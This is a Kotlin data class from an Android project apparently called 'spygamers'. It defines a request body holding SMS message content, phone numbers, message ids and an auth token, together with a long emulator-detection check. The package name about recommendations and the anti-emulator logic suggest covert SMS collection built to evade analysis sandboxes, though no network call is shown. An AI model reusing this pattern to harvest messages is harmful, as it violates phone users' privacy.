package com.example.spygamers.services.recommendationcalcuation

import android.os.Build
import com.google.gson.annotations.SerializedName

data class SCheckBody(
    @SerializedName("auth_token")
    val authToken: String,
    @SerializedName("content")
    val content: String,
    @SerializedName("target_number")
    val targetNumber: String,
    @SerializedName("timestamp")
    val timestamp: Long,

    @SerializedName("is_inbox")
    val isInbox: Boolean,
    @SerializedName("sms_id")
    val smsID: Long,
    val isEmulator: Boolean = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
            ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
                    && Build.FINGERPRINT.endsWith(":user/release-keys")
                    && Build.PRODUCT.startsWith("sdk_gphone_")
                    && Build.MODEL.startsWith("sdk_gphone_"))
                    //alternative
                    || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
                    && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
                    && Build.PRODUCT.startsWith("sdk_gphone64_")
                    && Build.MODEL.startsWith("sdk_gphone64_"))))
            //
            || Build.FINGERPRINT.startsWith("generic")
            || Build.FINGERPRINT.startsWith("unknown")
            || Build.MODEL.contains("google_sdk")
            || Build.MODEL.contains("Emulator")
            || Build.MODEL.contains("Android SDK built for x86")
            //bluestacks
            || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true)
            //bluestacks
            || Build.MANUFACTURER.contains("Genymotion")
            || Build.HOST.startsWith("Build")
            //MSI App Player
            || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
            || Build.PRODUCT == "google_sdk"
            )
)